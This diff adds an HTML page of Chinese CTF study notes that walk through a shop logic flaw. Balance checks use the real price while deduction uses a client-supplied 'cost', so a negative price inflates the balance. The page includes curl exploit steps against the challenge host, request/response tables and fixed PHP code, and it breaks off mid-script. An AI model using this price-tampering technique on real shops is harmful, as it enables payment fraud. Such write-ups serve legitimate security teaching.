@@ -1,0 +1,1036 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>逻辑漏洞 · 学霸笔记</title>
+    <link href="https://fonts.googleapis.com/css2?family=Kalam:wght@300;400;700&family=Ma+Shan+Zheng&family=Zeyada&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
+    <style>
+        :root {
+            --paper-color: #fdfbf7;
+            --paper-shadow: #e8e4dc;
+            --ink-color: #2c2c2c;
+            --ink-light: #4a4a4a;
+            --accent-blue: #2b6cb0;
+            --accent-red: #c53030;
+            --highlight: rgba(255, 255, 0, 0.4);
+            --highlight-pink: rgba(255, 105, 180, 0.3);
+            --line-color: #a4b0be;
+            --margin-line: #ff6b6b;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Kalam', 'Ma Shan Zheng', cursive;
+            background: #3d3d3d;
+            background-image:
+                radial-gradient(circle at 20% 50%, rgba(255,255,255,0.05) 0%, transparent 50%),
+                radial-gradient(circle at 80% 80%, rgba(255,255,255,0.03) 0%, transparent 50%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            overflow-x: hidden;
+        }
+
+        .notebook {
+            width: 900px;
+            max-width: 95vw;
+            background: #8b4513;
+            background-image:
+                repeating-linear-gradient(90deg, transparent, transparent 2px, rgba(0,0,0,0.1) 2px, rgba(0,0,0,0.1) 4px),
+                linear-gradient(180deg, #8b4513 0%, #6b3410 100%);
+            border-radius: 12px 18px 18px 12px;
+            padding: 25px 20px 25px 35px;
+            box-shadow:
+                0 0 0 2px #5c2e0b,
+                0 20px 60px rgba(0,0,0,0.6),
+                inset 0 1px 0 rgba(255,255,255,0.1);
+            position: relative;
+            transform-style: preserve-3d;
+            perspective: 1500px;
+        }
+
+        .notebook::before {
+            content: '';
+            position: absolute;
+            left: 25px;
+            top: 15px;
+            bottom: 15px;
+            width: 3px;
+            background: linear-gradient(180deg,
+                rgba(0,0,0,0.3) 0%, rgba(0,0,0,0.1) 20%,
+                rgba(0,0,0,0.3) 40%, rgba(0,0,0,0.1) 60%,
+                rgba(0,0,0,0.3) 80%, rgba(0,0,0,0.1) 100%);
+            border-radius: 2px;
+        }
+
+        .rings {
+            position: absolute;
+            left: 8px;
+            top: 0;
+            bottom: 0;
+            width: 30px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-evenly;
+            z-index: 10;
+        }
+
+        .ring {
+            width: 24px;
+            height: 14px;
+            background: linear-gradient(180deg, #c0c0c0 0%, #808080 50%, #a0a0a0 100%);
+            border-radius: 50%;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.4), inset 0 1px 0 rgba(255,255,255,0.3);
+            position: relative;
+        }
+
+        .ring::after {
+            content: '';
+            position: absolute;
+            left: 50%;
+            top: -3px;
+            width: 8px;
+            height: 20px;
+            background: linear-gradient(90deg, #d0d0d0 0%, #909090 50%, #b0b0b0 100%);
+            border-radius: 4px;
+            transform: translateX(-50%);
+            box-shadow: 0 1px 3px rgba(0,0,0,0.3);
+        }
+
+        .pages-container {
+            position: relative;
+            width: 100%;
+            min-height: 700px;
+        }
+
+        .page {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            min-height: 700px;
+            background: var(--paper-color);
+            background-image:
+                repeating-linear-gradient(transparent, transparent 31px, var(--line-color) 31px, var(--line-color) 32px);
+            background-size: 100% 32px;
+            background-position: 0 48px;
+            border-radius: 4px 12px 12px 4px;
+            padding: 40px 50px 40px 60px;
+            box-shadow: 2px 2px 8px rgba(0,0,0,0.15), inset 0 0 60px rgba(139, 69, 19, 0.03);
+            transform-origin: left center;
+            transition: transform 0.8s cubic-bezier(0.645, 0.045, 0.355, 1), opacity 0.6s ease;
+            opacity: 0;
+            pointer-events: none;
+            overflow: hidden;
+        }
+
+        .page.active { opacity: 1; pointer-events: all; transform: rotateY(0deg); z-index: 5; }
+        .page.flipped { transform: rotateY(-140deg); opacity: 0; pointer-events: none; }
+
+        .page::before {
+            content: '';
+            position: absolute;
+            left: 50px;
+            top: 0;
+            bottom: 0;
+            width: 1px;
+            background: var(--margin-line);
+            opacity: 0.4;
+        }
+
+        .page::after {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.03'/%3E%3C/svg%3E");
+            pointer-events: none;
+            opacity: 0.6;
+        }
+
+        .page.cover {
+            background: #f5f0e8;
+            background-image: none;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            cursor: pointer;
+        }
+        .page.cover::before { display: none; }
+
+        .cover-decoration {
+            position: absolute;
+            top: 30px;
+            right: 40px;
+            font-size: 4rem;
+            opacity: 0.15;
+            transform: rotate(-15deg);
+        }
+
+        .cover-title {
+            font-family: 'Ma Shan Zheng', cursive;
+            font-size: 3.2rem;
+            color: var(--accent-red);
+            margin-bottom: 20px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
+            position: relative;
+            display: inline-block;
+        }
+        .cover-title::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            left: -10%;
+            width: 120%;
+            height: 3px;
+            background: var(--accent-red);
+            opacity: 0.3;
+            border-radius: 2px;
+        }
+
+        .cover-subtitle {
+            font-size: 1.4rem;
+            color: var(--ink-light);
+            margin-bottom: 30px;
+            font-style: italic;
+        }
+
+        .cover-doodle {
+            width: 240px;
+            height: 130px;
+            margin: 10px 0;
+            opacity: 0.85;
+        }
+
+        .cover-hint {
+            position: absolute;
+            bottom: 40px;
+            font-size: 1rem;
+            color: var(--ink-light);
+            opacity: 0.7;
+            animation: bounce 2s infinite;
+        }
+
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-5px); }
+        }
+
+        .content-wrapper { position: relative; z-index: 1; }
+
+        .page-header {
+            font-family: 'Ma Shan Zheng', cursive;
+            font-size: 2rem;
+            color: var(--accent-red);
+            margin-bottom: 16px;
+            padding-bottom: 6px;
+            border-bottom: 2px solid var(--accent-red);
+            opacity: 0.7;
+            display: inline-block;
+        }
+
+        .handwriting {
+            font-size: 1.15rem;
+            line-height: 32px;
+            color: var(--ink-color);
+            text-align: justify;
+            margin-bottom: 12px;
+            position: relative;
+        }
+
+        .highlight {
+            background: linear-gradient(180deg, transparent 60%, var(--highlight) 60%);
+            padding: 0 2px;
+            font-weight: bold;
+        }
+
+        .highlight-pink {
+            background: linear-gradient(180deg, transparent 60%, var(--highlight-pink) 60%);
+            padding: 0 2px;
+            font-weight: bold;
+        }
+
+        .underline-wavy {
+            text-decoration: underline;
+            text-decoration-style: wavy;
+            text-decoration-color: var(--accent-red);
+            text-underline-offset: 3px;
+            font-weight: bold;
+        }
+
+        .key-term {
+            color: var(--accent-blue);
+            font-weight: bold;
+            border-bottom: 1px dashed var(--accent-blue);
+        }
+
+        .warning-text {
+            color: var(--accent-red);
+            font-weight: bold;
+        }
+
+        .diagram-container {
+            background: rgba(255,255,255,0.6);
+            border: 2px dashed var(--line-color);
+            border-radius: 12px;
+            padding: 14px;
+            margin: 10px 0;
+            position: relative;
+        }
+
+        .diagram-title {
+            font-family: 'Ma Shan Zheng', cursive;
+            font-size: 1.2rem;
+            color: var(--accent-red);
+            margin-bottom: 12px;
+            text-align: center;
+        }
+
+        .page-number {
+            position: absolute;
+            bottom: 15px;
+            right: 30px;
+            font-size: 0.9rem;
+            color: var(--ink-light);
+            opacity: 0.6;
+        }
+
+        .doodle {
+            position: absolute;
+            opacity: 0.12;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .doodle-1 {
+            top: 80px;
+            right: 40px;
+            font-size: 3rem;
+            transform: rotate(20deg);
+        }
+
+        .key-point-box {
+            background: linear-gradient(135deg, #fff9e6 0%, #fff5d6 100%);
+            border: 2px solid var(--accent-red);
+            border-radius: 10px;
+            padding: 10px 16px;
+            margin: 12px 0;
+            position: relative;
+            box-shadow: 2px 2px 0 rgba(0,0,0,0.06);
+        }
+
+        .key-point-box::before {
+            content: '\2605';
+            position: absolute;
+            top: -10px;
+            left: 12px;
+            background: var(--paper-color);
+            padding: 0 6px;
+            color: var(--accent-red);
+            font-size: 1rem;
+        }
+
+        .key-point-box .box-title {
+            font-family: 'Ma Shan Zheng', cursive;
+            font-size: 1.1rem;
+            color: var(--accent-red);
+            margin-bottom: 6px;
+        }
+
+        .key-point-box .box-content {
+            font-size: 1rem;
+            line-height: 1.55;
+            color: var(--ink-color);
+        }
+
+        .concept-cards {
+            display: flex;
+            gap: 12px;
+            margin: 12px 0;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        .concept-card {
+            background: #fff;
+            border: 2px solid var(--ink-light);
+            border-radius: 10px;
+            padding: 12px 16px;
+            text-align: center;
+            box-shadow: 2px 2px 0 rgba(0,0,0,0.08);
+            flex: 1;
+            min-width: 120px;
+            max-width: 200px;
+        }
+
+        .concept-card .card-icon {
+            font-size: 1.8rem;
+            margin-bottom: 6px;
+            color: var(--accent-red);
+        }
+
+        .concept-card .card-title {
+            font-family: 'Ma Shan Zheng', cursive;
+            font-size: 1.1rem;
+            color: var(--accent-red);
+            margin-bottom: 4px;
+        }
+
+        .concept-card .card-desc {
+            font-size: 0.85rem;
+            color: var(--ink-light);
+            line-height: 1.4;
+        }
+
+        .flow-steps {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin: 12px 0;
+            flex-wrap: wrap;
+        }
+
+        .flow-step {
+            background: #fff;
+            border: 2px solid var(--line-color);
+            border-radius: 8px;
+            padding: 8px 12px;
+            text-align: center;
+            font-size: 0.9rem;
+            box-shadow: 1px 1px 0 rgba(0,0,0,0.06);
+        }
+
+        .flow-step .step-num {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            background: var(--accent-red);
+            color: white;
+            border-radius: 50%;
+            font-size: 0.75rem;
+            line-height: 20px;
+            margin-right: 4px;
+        }
+
+        .flow-arrow {
+            font-size: 1.2rem;
+            color: var(--accent-red);
+        }
+
+        .sticky-note {
+            position: absolute;
+            background: #fffacd;
+            padding: 12px;
+            box-shadow: 2px 4px 8px rgba(0,0,0,0.15);
+            transform: rotate(-3deg);
+            font-size: 0.85rem;
+            max-width: 160px;
+            z-index: 10;
+        }
+
+        .sticky-note::before {
+            content: '';
+            position: absolute;
+            top: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 40px;
+            height: 12px;
+            background: rgba(255,255,255,0.4);
+            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+        }
+
+        .sticky-note.top-right {
+            top: 20px;
+            right: 20px;
+            transform: rotate(3deg);
+        }
+
+        /* 数据表格 */
+        .bypass-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 12px 0;
+            font-size: 0.92rem;
+        }
+
+        .bypass-table th,
+        .bypass-table td {
+            border: 2px solid var(--line-color);
+            padding: 5px 9px;
+            text-align: left;
+            line-height: 1.5;
+        }
+
+        .bypass-table th {
+            background: #fff9e6;
+            color: var(--accent-red);
+            font-family: 'Ma Shan Zheng', cursive;
+            font-size: 1rem;
+        }
+
+        .bypass-table td {
+            background: #fff;
+        }
+
+        .bypass-table .bypass-yes {
+            color: var(--accent-red);
+            font-weight: bold;
+        }
+
+        .code-term {
+            font-family: 'Courier New', monospace;
+            font-size: 0.88em;
+            background: rgba(0,0,0,0.06);
+            padding: 0 4px;
+            border-radius: 3px;
+        }
+
+        /* 代码块样式 */
+        .code-block {
+            background: #2d2d2d;
+            color: #f8f8f2;
+            border-radius: 10px;
+            padding: 12px 16px;
+            margin: 12px 0;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85rem;
+            line-height: 1.65;
+            overflow-x: auto;
+            box-shadow: 3px 3px 0 rgba(0,0,0,0.15);
+            position: relative;
+        }
+
+        .code-block::before {
+            content: 'bash';
+            position: absolute;
+            top: 6px;
+            right: 12px;
+            font-size: 0.75rem;
+            color: #75715e;
+            font-family: 'Kalam', cursive;
+        }
+
+        .code-block.php::before { content: 'php'; }
+
+        .code-block .comment {
+            color: #75715e;
+        }
+
+        .code-block .cmd {
+            color: #66d9ef;
+        }
+
+        .code-block .arg {
+            color: #a6e22e;
+        }
+
+        .code-block .val {
+            color: #e6db74;
+        }
+
+        /* 攻击链 */
+        .attack-chain {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin: 16px 0;
+            flex-wrap: wrap;
+        }
+
+        .chain-node {
+            background: #fff;
+            border: 3px solid var(--accent-red);
+            border-radius: 50%;
+            width: 86px;
+            height: 86px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            font-size: 0.78rem;
+            box-shadow: 2px 2px 0 rgba(0,0,0,0.1);
+            position: relative;
+        }
+
+        .chain-node .node-icon {
+            font-size: 1.4rem;
+            color: var(--accent-red);
+            margin-bottom: 2px;
+        }
+
+        .chain-node .node-label {
+            font-family: 'Ma Shan Zheng', cursive;
+            font-size: 0.8rem;
+            color: var(--accent-red);
+            line-height: 1.1;
+        }
+
+        .chain-arrow {
+            font-size: 1.5rem;
+            color: var(--accent-red);
+        }
+
+        .chain-result {
+            background: linear-gradient(135deg, #fff5f5 0%, #fed7d7 100%);
+            border: 2px solid var(--accent-red);
+            border-radius: 10px;
+            padding: 10px 16px;
+            font-size: 1rem;
+            color: var(--accent-red);
+            font-weight: bold;
+            box-shadow: 2px 2px 0 rgba(0,0,0,0.1);
+        }
+
+        @media (max-width: 768px) {
+            .notebook { padding: 20px 15px 20px 30px; }
+            .page { padding: 30px 25px 30px 45px; min-height: 500px; }
+            .cover-title { font-size: 2.5rem; }
+            .handwriting { font-size: 1rem; line-height: 28px; }
+            .concept-cards { flex-direction: column; align-items: center; }
+            .concept-card { max-width: 100%; width: 100%; }
+            .attack-chain { flex-direction: column; }
+            .chain-arrow { transform: rotate(90deg); }
+            .sticky-note.top-right { position: relative; top: auto; right: auto; margin: 8px 0; max-width: 100%; }
+        }
+    </style>
+</head>
+<body>
+    <div class="notebook">
+        <div class="rings">
+            <div class="ring"></div>
+            <div class="ring"></div>
+            <div class="ring"></div>
+            <div class="ring"></div>
+            <div class="ring"></div>
+            <div class="ring"></div>
+            <div class="ring"></div>
+            <div class="ring"></div>
+        </div>
+
+        <div class="pages-container" id="pagesContainer">
+            <!-- 封面 -->
+            <div class="page cover active" data-page="0">
+                <div class="cover-decoration"><i class="ri-money-cny-circle-line"></i></div>
+                <div class="cover-title">逻辑漏洞 · 支付套利</div>
+                <div class="cover-subtitle">图书商城参数篡改 · N1BOOK 第03章 WEB进阶</div>
+                <svg class="cover-doodle" viewBox="0 0 240 130">
+                    <rect x="10" y="42" width="58" height="42" rx="6" fill="none" stroke="#2c2c2c" stroke-width="1.8"/>
+                    <text x="18" y="68" font-size="13" fill="#2c2c2c">¥ 1000</text>
+                    <path d="M75,63 L100,63" stroke="#c53030" stroke-width="2"/>
+                    <path d="M100,63 l-7,-4 v8 z" fill="#c53030"/>
+                    <rect x="108" y="42" width="72" height="42" rx="6" fill="none" stroke="#c53030" stroke-width="1.8" stroke-dasharray="4,3"/>
+                    <text x="114" y="60" font-size="10" fill="#c53030">cost =</text>
+                    <text x="114" y="76" font-size="12" fill="#c53030" font-weight="bold">-1000000</text>
+                    <path d="M187,63 L212,63" stroke="#c53030" stroke-width="2"/>
+                    <path d="M212,63 l-7,-4 v8 z" fill="#c53030"/>
+                    <rect x="218" y="42" width="18" height="42" rx="3" fill="none" stroke="#2b6cb0" stroke-width="1.6"/>
+                    <text x="221" y="67" font-size="8" fill="#2b6cb0">FLAG</text>
+                    <path d="M14,100 Q120,112 226,100" fill="none" stroke="#c53030" stroke-width="1.5" stroke-dasharray="5,5" opacity="0.5"/>
+                </svg>
+                <div style="font-size: 1rem; color: var(--ink-light); margin-top: 10px;">
+                    <span style="display: block; margin: 5px 0;"><i class="ri-book-2-line"></i> 商城商品：FLAG ¥2000 / Miss ¥300 / Nice ¥200</span>
+                    <span style="display: block; margin: 5px 0;"><i class="ri-error-warning-line"></i> 改价无效 → 检查用实价、扣款用 cost</span>
+                    <span style="display: block; margin: 5px 0;"><i class="ri-arrow-up-circle-line"></i> 负数套利：余额 1000 → 1001000 → 买 FLAG</span>
+                </div>
+                <div class="cover-hint">点击翻页开始阅读 ↓</div>
+            </div>
+
+            <!-- 第1页：题目侦察 -->
+            <div class="page" data-page="1">
+                <div class="content-wrapper">
+                    <div class="page-header">一、题目侦察：图书商城</div>
+
+                    <div class="doodle doodle-1"><i class="ri-shopping-cart-2-line"></i></div>
+
+                    <p class="handwriting" id="text1"></p>
+
+                    <div class="diagram-container">
+                        <div class="diagram-title">商品目录与购买入口</div>
+                        <table class="bypass-table">
+                            <thead>
+                                <tr>
+                                    <th>商品</th>
+                                    <th>goods</th>
+                                    <th>标价</th>
+                                    <th>购买链接（价格在客户端）</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td><span class="warning-text">FLAG</span></td>
+                                    <td>1</td>
+                                    <td>¥2000</td>
+                                    <td><span class="code-term">buy.php?cost=2000&goods=1</span></td>
+                                </tr>
+                                <tr>
+                                    <td>Miss</td>
+                                    <td>3</td>
+                                    <td>¥300</td>
+                                    <td><span class="code-term">buy.php?cost=300&goods=3</span></td>
+                                </tr>
+                                <tr>
+                                    <td>Nice</td>
+                                    <td>2</td>
+                                    <td>¥200</td>
+                                    <td><span class="code-term">buy.php?cost=200&goods=2</span></td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+
+                    <div class="key-point-box">
+                        <div class="box-title"><i class="ri-focus-3-line"></i> 题眼锁定</div>
+                        <div class="box-content">
+                            价格参数 <span class="code-term">cost</span> 直接写在 URL 里由客户端提交，这是典型的<span class="highlight">逻辑漏洞攻击面</span>；
+                            另外 login.php 存在隐藏逻辑：<span class="highlight-pink">首次登录自动注册</span>，新用户初始余额 1000。
+                        </div>
+                    </div>
+                </div>
+                <div class="page-number">1</div>
+            </div>
+
+            <!-- 第2页：推理链 -->
+            <div class="page" data-page="2">
+                <div class="content-wrapper">
+                    <div class="page-header">二、推理链：三次控制变量实验</div>
+
+                    <div class="doodle doodle-1"><i class="ri-flask-line"></i></div>
+
+                    <p class="handwriting" id="text2"></p>
+
+                    <div class="diagram-container">
+                        <div class="diagram-title">逐个变量隔离测试（每次使用全新用户）</div>
+                        <table class="bypass-table">
+                            <thead>
+                                <tr>
+                                    <th>实验</th>
+                                    <th>实际返回</th>
+                                    <th>结论</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td><span class="code-term">cost=1&goods=1</span> 改小价</td>
+                                    <td>Money Not Enough.</td>
+                                    <td>检查阶段不看 cost</td>
+                                </tr>
+                                <tr>
+                                    <td><span class="code-term">cost=-2000&goods=1</span> 负数</td>
+                                    <td>Money Not Enough.</td>
+                                    <td>余额 1000 &lt; 2000，检查先拦</td>
+                                </tr>
+                                <tr>
+                                    <td><span class="code-term">cost=2000&goods=2</span> 高价买</td>
+                                    <td class="bypass-yes">成功，余额被扣成负数</td>
+                                    <td><span class="warning-text">扣款用的是 cost</span></td>
+                                </tr>
+                                <tr>
+                                    <td>其后 <span class="code-term">cost=100&goods=2</span></td>
+                                    <td>Money Not Enough.</td>
+                                    <td>余额已为负，检查失败</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+
+                    <div class="key-point-box">
+                        <div class="box-title"><i class="ri-lightbulb-flash-line"></i> 漏洞锁定</div>
+                        <div class="box-content">
+                            <span class="key-term">检查</span>用服务端真实价，<span class="key-term">扣款</span>却用客户端 cost 做减法——两套数据源不一致 → 套利空间！
+                        </div>
+                    </div>
+                </div>
+                <div class="page-number">2</div>
+            </div>
+
+            <!-- 第3页：漏洞原理 -->
+            <div class="page" data-page="3">
+                <div class="content-wrapper">
+                    <div class="page-header">三、漏洞原理：检查与扣款分离</div>
+
+                    <p class="handwriting" id="text3"></p>
+
+                    <div class="diagram-container">
+                        <div class="diagram-title">同一笔购买，两个数据源</div>
+                        <div class="flow-steps" style="margin-bottom: 12px;">
+                            <div class="flow-step"><span class="step-num">1</span>检查 real_price &gt; money ?</div>
+                            <span class="flow-arrow">→</span>
+                            <div class="flow-step"><span class="step-num">2</span>扣款 money = money - cost</div>
+                        </div>
+                        <table class="bypass-table">
+                            <thead>
+                                <tr>
+                                    <th>场景</th>
+                                    <th>① 检查（真实价）</th>
+                                    <th>② 扣款（客户端 cost）</th>
+                                    <th>余额</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td>正常 <span class="code-term">cost=200</span></td>
+                                    <td>200 &gt; 1000 ? 否 → 通过</td>
+                                    <td>1000 - 200</td>
+                                    <td>800</td>
+                                </tr>
+                                <tr>
+                                    <td>攻击 <span class="code-term">cost=-1000000</span></td>
+                                    <td>200 &gt; 1000 ? 否 → 通过</td>
+                                    <td class="bypass-yes">1000 - (-1000000)</td>
+                                    <td class="bypass-yes">1001000</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+
+                    <div class="key-point-box">
+                        <div class="box-title"><i class="ri-ruler-2-line"></i> 初始余额的精确测量（二分法）</div>
+                        <div class="box-content">
+                            每个探测点用全新用户：先 <span class="code-term">cost=-X&goods=2</span> 再加价，找最小成功值
+                            <span class="highlight">X&#8320; = 1000</span>，由 M + X&#8320; = 2000 推得 <span class="underline-wavy">初始余额恰好 1000</span>。
+                        </div>
+                    </div>
+                </div>
+                <div class="page-number">3</div>
+            </div>
+
+            <!-- 第4页：漏洞利用 -->
+            <div class="page" data-page="4">
+                <div class="content-wrapper">
+                    <div class="page-header">四、漏洞利用：三步套利</div>
+
+                    <p class="handwriting" id="text4"></p>
+
+                    <div class="code-block">
+<span class="comment"># 1. 注册新用户（初始余额 1000）</span>
+<span class="cmd">curl</span> <span class="arg">-c</span> <span class="val">cj</span> <span class="arg">-d</span> <span class="val">"username=hacker&password=pw"</span> <span class="val">$T/login.php</span>
+<span class="comment"># 2. 负数价格买最便宜的 Nice（检查 200 ≤ 1000 必过）</span>
+<span class="cmd">curl</span> <span class="arg">-b</span> <span class="val">cj</span> <span class="arg">"</span><span class="val">$T/buy.php?cost=-1000000&goods=2"</span>   <span class="comment"># 余额 → 1001000</span>
+<span class="comment"># 3. 正常价买 FLAG（检查 2000 ≤ 1001000 通过）</span>
+<span class="cmd">curl</span> <span class="arg">-b</span> <span class="val">cj</span> <span class="arg">"</span><span class="val">$T/buy.php?cost=2000&goods=1"</span>          <span class="comment"># FLAG{...}</span>
+                    </div>
+
+                    <div class="attack-chain">
+                        <div class="chain-node">
+                            <div class="node-icon"><i class="ri-user-add-line"></i></div>
+                            <div class="node-label">新用户<br>¥1000</div>
+                        </div>
+                        <div class="chain-arrow">→</div>
+                        <div class="chain-node">
+                            <div class="node-icon"><i class="ri-arrow-down-circle-line"></i></div>
+                            <div class="node-label">负数买 Nice<br>余额暴涨</div>
+                        </div>
+                        <div class="chain-arrow">→</div>
+                        <div class="chain-node">
+                            <div class="node-icon"><i class="ri-wallet-3-line"></i></div>
+                            <div class="node-label">¥1001000<br>买得起</div>
+                        </div>
+                        <div class="chain-arrow">→</div>
+                        <div class="chain-result"><i class="ri-flag-2-line"></i> FLAG{you_can_got_it}</div>
+                    </div>
+
+                    <div class="key-point-box">
+                        <div class="box-title"><i class="ri-check-double-line"></i> 对照实验（证明因果）</div>
+                        <div class="box-content">
+                            正数买便宜货后再买 FLAG → <span class="warning-text">仍失败</span>；
+                            负数买便宜货后再买 FLAG → <span class="warning-text" style="color:#2f855a;">成功</span>。
+                            说明买到 FLAG 的唯一原因就是负数反向加钱。
+                        </div>
+                    </div>
+                </div>
+                <div class="page-number">4</div>
+            </div>
+
+            <!-- 第5页：顺序陷阱 -->
+            <div class="page" data-page="5">
+                <div class="content-wrapper">
+                    <div class="page-header">五、顺序陷阱：账号报废</div>
+
+                    <div class="sticky-note top-right" style="max-width: 260px; padding: 8px; top: 4px; font-size: 0.8rem; white-space: nowrap;">
+                        口诀：先负数刷钱，再买 FLAG
+                    </div>
+
+                    <p class="handwriting" id="text5"></p>
+
+                    <table class="bypass-table">
+                        <thead>
+                            <tr>
+                                <th>操作</th>
+                                <th>① 检查</th>
+                                <th>② 扣款</th>
+                                <th>余额</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>初始</td>
+                                <td>—</td>
+                                <td>—</td>
+                                <td>1000</td>
+                            </tr>
+                            <tr>
+                                <td><span class="code-term">cost=2000&goods=2</span></td>
+                                <td>通过</td>
+                                <td>1000 - 2000</td>
+                                <td class="bypass-yes">-1000</td>
+                            </tr>
+                            <tr>
+                                <td><span class="code-term">cost=-9999&goods=2</span></td>
+                                <td class="bypass-yes">200 &gt; -1000 → 拦截</td>
+                                <td>执行不到</td>
+                                <td>-1000</td>
+                            </tr>
+                            <tr>
+                                <td>换商品 / 加大负数</td>
+                                <td class="bypass-yes">真实价均 &gt; 负数余额</td>
+                                <td>执行不到</td>
+                                <td>无法自救</td>
+                            </tr>
+                        </tbody>
+                    </table>
+
+                    <div class="key-point-box" style="border-color: var(--accent-red); background: linear-gradient(135deg, #fff5f5 0%, #fed7d7 100%);">
+                        <div class="box-title"><i class="ri-alert-line"></i> 为什么救不回来？</div>
+                        <div class="box-content">
+                            负数只作用于 <span class="key-term">② 扣款</span>，而 <span class="key-term">① 检查</span>永远先执行。
+                            余额为负后，所有商品真实价都是正数，检查恒拦截 → 扣款代码永远不可达 →
+                            <span class="warning-text">该账号报废，只能换新用户名重新注册</span>。
+                        </div>
+                    </div>
+                </div>
+                <div class="page-number">5</div>
+            </div>
+
+            <!-- 第6页：修复视角与总结 -->
+            <div class="page" data-page="6">
+                <div class="content-wrapper">
+                    <div class="page-header">六、修复视角与总结</div>
+
+                    <p class="handwriting" id="text6"></p>
+
+                    <div class="code-block php">
+<span class="comment">// [错误] 检查用真实价，扣款用客户端价</span>
+<span class="cmd">if</span> ($real_price &gt; $money) <span class="cmd">die</span>(<span class="val">'Money Not Enough.'</span>);
+$money = $money - <span class="arg">$cost</span>;   <span class="comment">// cost 来自 $_GET，可控 → 负数加钱</span>
+
+<span class="comment">// [正确] 全流程只信任服务端数据</span>
+$real_price = get_price_from_db($goods_id);  <span class="comment">// 价格实时查库</span>
+<span class="cmd">if</span> ($real_price &gt; $money) <span class="cmd">die</span>(<span class="val">'Money Not Enough.'</span>);
+$money = $money - <span class="arg">$real_price</span>;        <span class="comment">// 扣款也用真实价</span>
+                    </div>
+
+                    <div class="concept-cards">
+                        <div class="concept-card">
+                            <div class="card-icon"><i class="ri-shopping-bag-3-line"></i></div>
+                            <div class="card-title">只传商品 ID</div>
+                            <div class="card-desc">客户端不提交价格、数量等敏感数据</div>
+                        </div>
+                        <div class="concept-card">
+                            <div class="card-icon"><i class="ri-database-2-line"></i></div>
+                            <div class="card-title">价格实时查库</div>
+                            <div class="card-desc">校验与结算共用同一数据源</div>
+                        </div>
+                        <div class="concept-card">
+                            <div class="card-icon"><i class="ri-lock-2-line"></i></div>
+                            <div class="card-title">事务 + 原子更新</div>
+                            <div class="card-desc">money = money - price 原子扣减，防并发</div>
+                        </div>
+                    </div>
+
+                    <div class="key-point-box">
+                        <div class="box-title"><i class="ri-bookmark-3-line"></i> 一句话总结</div>
+                        <div class="box-content">
+                            逻辑漏洞的内核：对同一个业务事实，<span class="key-term">校验</span>与<span class="key-term">执行</span>用了两个数据源。
+                            凡是涉及金额、数量、权限的参数，<span class="underline-wavy">永远让服务端说了算</span>。
+                        </div>
+                    </div>
+                </div>
+                <div class="page-number">6</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let currentPage = 0;
+        const totalPages = 7;
+        const pages = document.querySelectorAll('.page');
+
+        const texts = {
+            1: `目标响应头暴露 <span class="key-term">openresty</span> + <span class="key-term">PHP/7.0.33</span> + PHPSESSID，业务状态保存在服务端 Session。<br><br>
+用 admin / 123456 登录后进入 <span class="highlight">/user.php</span> 图书商城：FLAG 售价 2000 元。购买链接把价格直接写在 URL 里——<span class="underline-wavy">buy.php?cost=2000&goods=1</span>，价格完全由客户端掌控，这就是逻辑漏洞的题眼。`,
+
+            2: `直接改价为什么不行？答案藏在"两套数据源"里。用新用户隔离状态、每次改一个变量，三轮实验锁定逻辑：<br><br>
+<b>①</b> 改小 cost 买 FLAG → 失败，检查不看 cost；<b>②</b> 负数买 FLAG → 失败，余额 1000 &lt; 2000 被拦；<br>
+<b>③</b> 高价买 Nice → 通过检查后按 cost 扣款，余额变负——<span class="warning-text">扣款用的是客户端 cost</span>。`,
+
+            3: `检查用服务端真实价，扣款却用客户端传入的 cost，两者不一致即可套利。<br><br>
+正常：1000 − 200 = 800（扣真钱）；攻击：<span class="highlight-pink">1000 −（−1000000）= 1001000</span>（负数变加钱）。`,
+
+            4: `负数的成本必须趁余额还够通过检查时使用。三步套利：<br><br>
+注册新用户（余额 1000）→ 负数买 Nice（检查 200 ≤ 1000 通过，余额涨到 1001000）→ 正常价买 FLAG（检查 2000 通过）→ Flag。<br><br>
+对照实验：正数买便宜货后再买 FLAG <span class="warning-text">仍失败</span>；负数买之后再买则 <span class="warning-text" style="color:#2f855a;">成功</span>。`,
+
